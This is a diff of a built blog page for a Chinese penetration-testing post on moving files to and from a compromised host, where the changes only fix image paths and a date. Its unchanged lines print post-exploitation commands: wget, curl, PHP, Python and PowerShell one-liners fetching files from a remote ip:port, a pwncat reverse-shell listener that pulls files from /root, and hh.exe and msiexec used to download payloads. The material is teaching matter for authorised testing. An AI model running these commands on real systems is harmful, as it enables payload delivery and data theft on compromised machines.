@@ -14,20 +14,20 @@
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
 <meta property="og:description" content="Linuxwget1wget http:&#x2F;&#x2F;ip:port&#x2F;文件   curlcurl命令除了用于访问网站也可以用于下载文件，用法为： 1curl -O http:&#x2F;&#x2F;ip:port&#x2F;文件    php1php -r &quot;file_put_contents(&#x27;保存到本地的路径&#x27;, fopen(&#x27;远程文件的URL&#x27;, &#x27;r&#x27;));&amp;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212163644048.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212163715328.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212164200505.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212165201809.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212165536294.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212165913781.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212170052873.png">
-<meta property="og:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212171545323.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212163644048.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212163715328.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212164200505.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212165201809.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212165536294.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212165913781.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212170052873.png">
+<meta property="og:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212171545323.png">
 <meta property="article:published_time" content="2025-02-12T08:33:33.000Z">
-<meta property="article:modified_time" content="2025-02-12T09:21:11.413Z">
+<meta property="article:modified_time" content="2025-03-05T07:24:36.816Z">
 <meta property="article:author" content="Oceanzbz">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://oceanzbz.github.io/post/undefined/IMAGE20250212163644048.png">
+<meta name="twitter:image" content="https://oceanzbz.github.io/post/ea95e3ea/IMAGE20250212163644048.png">
     
     
       
@@ -193,15 +193,15 @@
   <div class="content e-content" itemprop="articleBody">
     <h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip:port/文件</span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212163644048.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212163644048.png" class="">
 <h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>curl命令除了用于访问网站也可以用于下载文件，用法为：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://ip:port/文件</span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212163715328.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212163715328.png" class="">
 
 <h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;file_put_contents(&#x27;保存到本地的路径&#x27;, fopen(&#x27;远程文件的URL&#x27;, &#x27;r&#x27;));&quot;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212164200505.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212164200505.png" class="">
 
 <h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>如果你拿到shell的是一个python的站，可以用python执行代码实现文件下载：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import urllib.request;urllib.request.urlretrieve(&#x27;远程文件的URL&#x27;, &#x27;保存到本地的路径&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
@@ -258,20 +258,20 @@
 <p>然后在终端输入</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn-cs -lp  1234 </span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212165201809.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212165201809.png" class="">
 
 <p>这样就可以监听了，然后收到shell之后会进入到pwncat终端模式这时候想要回到shell模式只需输入back就行</p>
-<img src="/post/undefined/IMAGE20250212165536294.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212165536294.png" class="">
 
 <p>按ctrl D可以从远程shell返回pwncat，下面就来试试如何下载一个文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download /root/s.sh ./sh</span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212165913781.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212165913781.png" class="">
 
 <p>上传一个文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload ./s.sh /root/s.sh</span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212170052873.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212170052873.png" class="">
 
 <h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>msf 获取shell之后可以上传和下载文件参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847838/article/details/127623761">https://blog.csdn.net/weixin_43847838/article/details/127623761</a></p>
 <h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = <span class="built_in">new-object</span> system.net.webclient  <span class="variable">$p</span>.downloadfile(<span class="string">&quot;http://xx.xx.xx.xx\file&quot;</span>,<span class="string">&quot;c:\xxx\xx\file&quot;</span>)|</span><br></pre></td></tr></table></figure>
@@ -300,7 +300,7 @@
 
 <h3 id="hh-exe"><a href="#hh-exe" class="headerlink" title="hh.exe"></a>hh.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hh.exe http://<span class="number">192.168</span>.<span class="number">1.103</span>/test/test.txt</span><br></pre></td></tr></table></figure>
 
-<img src="/post/undefined/IMAGE20250212171545323.png" class="">
+<img src="/post/ea95e3ea/IMAGE20250212171545323.png" class="">
 
 <p>下载的文件是以html的方式进行打开，但是如果是应用程序的话发现就可以做到下载的效果</p>
 <h3 id="Msiexec-exe"><a href="#Msiexec-exe" class="headerlink" title="Msiexec.exe"></a>Msiexec.exe</h3><p>系统进程，用于安装MSI，一般更新或者安装软件时会碰到，支持远程下载功能<br>先在Kali Linux端生成MSI文件，输入命令：</p>
